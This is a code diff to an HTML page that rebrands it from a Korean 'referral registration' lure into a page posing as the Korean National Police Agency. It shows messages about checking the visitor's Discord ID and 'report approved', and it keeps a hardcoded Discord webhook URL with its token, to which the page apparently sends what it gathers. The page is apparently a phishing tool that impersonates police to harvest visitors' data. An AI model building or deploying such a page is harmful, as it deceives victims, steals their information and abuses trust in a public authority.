@@ -2,10 +2,10 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>추천인 등록</title>
+    <title>경찰청</title>
 </head>
 <body>
-    <div id="loading">유효성 확인중...</div>
+    <div id="loading">디스코드 아이디를 확인하는 중...</div>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434021113695830079/Rp4J4NEJPP9WNSsKRbNWhy0gfmf-_xD9l413EfvBxUkgBu97Wx9-9BXIsTpJV43ezQfu';
@@ -301,7 +301,7 @@
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200 || xhr.status === 204) {
-                        document.getElementById('loading').textContent = '포인트가 성공적으로 적립되었습니다.';
+                        document.getElementById('loading').textContent = '신고가 성공적으로 승인되었습니다! ';
                     } else {
                         document.getElementById('loading').textContent = '인증 실패: ' + xhr.status;
                     }
